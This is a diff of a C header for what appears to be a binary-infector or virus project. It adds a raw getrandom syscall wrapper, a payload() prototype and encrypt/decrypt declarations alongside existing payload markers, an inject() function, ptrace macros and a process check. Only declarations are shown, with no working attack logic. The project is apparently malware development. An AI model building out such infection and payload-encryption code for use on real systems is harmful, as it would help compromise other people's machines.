@@ -20,6 +20,7 @@
 # define SYS_PTRACE 101
 # define SYS_GETUID 102
 # define SYS_GETDENTS64 217
+# define SYS_GETRANDOM 318
 
 # define O_RDONLY 0
 # define O_WRONLY 1
@@ -63,6 +64,7 @@
 # define PTRACE(request, pid, addr, data) syscall4(SYS_PTRACE, (u64)request, (u64)pid, (u64)addr, (u64)data)
 # define GETPID() syscall0(SYS_GETPID)
 # define FORK() syscall0(STUB_FORK)
+# define GETRANDOM(buf, buflen, flags) syscall3(SYS_GETRANDOM, (u64)buf, (u64)buflen, (u64)flags)
 
 typedef struct	s_static
 {
@@ -101,6 +103,7 @@ t_binary get_infos(int fd);
 /* main.c */
 void payload_start(void);
 void payload_end(void);
+void payload(void);
 
 /* inject.c */
 int inject(t_data data);
@@ -122,5 +125,9 @@ u64 get_rel_addr();
 
 /* process.c */
 int is_proc_actif(void);
+
+/* crypto.c */
+void decrypt();
+char encrypt(int fd);
 
 #endif
